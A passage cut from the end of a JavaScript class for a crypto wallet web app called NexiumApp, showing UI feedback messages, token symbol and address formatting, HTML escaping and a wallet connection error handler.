      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
  }

  getTokenSymbol(address) {
    const token = TOKEN_LIST.find(t => t.address === address || (t.isNative && address === null));
    return token ? token.symbol : 'Unknown';
  }

  shortenAddress(address) {
    if (!address) return 'Native Token';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&apos;'
    }[m]));
  }

  handleConnectionError(error) {
    console.error('Connection error details:', error);
    this.showFeedback(`Wallet connection failed: ${error.message}`, 'error');
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.showMetaMaskPrompt();
    this.hideProcessingSpinner();
  }
}

new NexiumApp();